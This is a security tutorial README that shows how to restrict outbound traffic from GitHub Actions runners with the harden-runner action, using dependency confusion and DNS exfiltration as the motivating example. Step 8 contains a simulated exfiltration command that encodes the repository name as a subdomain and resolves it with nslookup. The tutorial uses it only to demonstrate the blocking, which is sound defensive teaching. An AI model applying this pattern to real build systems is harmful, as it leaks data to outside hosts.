<p align="left">
  <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/Logo.png" alt="Step Security Logo" width="340">
</p>

# Tutorial: Restrict outbound traffic from build server

## Summary of past incidents
### Dependency confusion attacks
In Feb 2021, Alex Birsan wrote about dependency confusion attacks, and how DNS exfiltration was used to collect information about different build servers, before launching a more specific attack. 

> Knowing that most of the possible targets would be deep inside well-protected corporate networks, I considered that **DNS exfiltration** was the way to go - Alex Birsan

This is a common theme where an attacker gets specific information about where their code is executing before tailoring their attack. This image is taken from the [dependency confusion attack blog post](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) and explains how DNS exfiltration works. Specific information (could be a secret) is set as a sub-domain to the attacker controlled domain, and the build server is asked to resolve the IP address for the sub-domain. Such DNS traffic is rarely filtered leading to a higher success rate. 

  <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfiltration.png" alt="DNS exfiltration" width="800">

## Tutorial
Learn how to prevent DNS exfiltration from a GitHub Actions workflow. 

1. Create a fork of the repo.

2. Go to the `Actions` tab in the fork. Click the `I understand my workflows, go ahead and enable them` button. 
   
   <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/EnableActions.png" alt="Enable Actions" width="800">

3. GitHub Action workflow files are in the `.github/workflows` folder of the repo. Browse to the `ci.yml` file. Edit it using the GitHub website, and add the `step-security/harden-runner` GitHub Action as the first step. Commit the changes either to `main` branch or any other branch.  

    ```
    - uses: step-security/harden-runner@v1
      with:
        egress-policy: audit
    ```

4. This change should cause the workflow to run, as it is set to run on push. Click on the `Actions` tab to view the workflow run. 

5. You should see a link to security insights and recommendations for the workflow run. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/InsightsLink.png" alt="Link to security insights" width="800">


6. Click on the link. You should see outbound traffic correlated with each step of the workflow. An outbound network policy would be recommended. 

7. Update the `ci.yml` workflow with the policy. The first step should now look like this. From now on, outbound traffic will be restricted to only these domains for this workflow. 

    ```
    - uses: step-security/harden-runner@v1
      with:
        allowed-endpoints: 
          codecov.io:443
          github.com:443
          storage.googleapis.com:443
    ```

8. Simulate a DNS exfiltration attack similar to the one used in the dependency confusion attack. Update the workflow and add the following statement. In the actual attack, the outbound call was made by a malicious package as part of `preinstall` step. In this case, just add this step to the workflow to simulate sending the repo name as a sub-domain to stepsecurity.io. 

    ```
    - name: Simulate DNS traffic
        run: |
          domain="${GITHUB_REPOSITORY}.stepsecurity.io"
          domain=${domain//\//-}
          nslookup "${domain}"
    ```

9. This change should cause the workflow to run, as it is set to run on push.

10. Observe that the workflow shows an annotation that the DNS resolution for the call is blocked. If you look at the build logs, you will notice that the bash script did not recive a valid response from the DNS server, and the exfiltration attempt was blocked. 

    <img src="https://raw.githubusercontent.com/step-security/supply-chain-goat/main/images/DNSExfilBlocked.png" alt="Blocked calls are shown in Red" width="800">
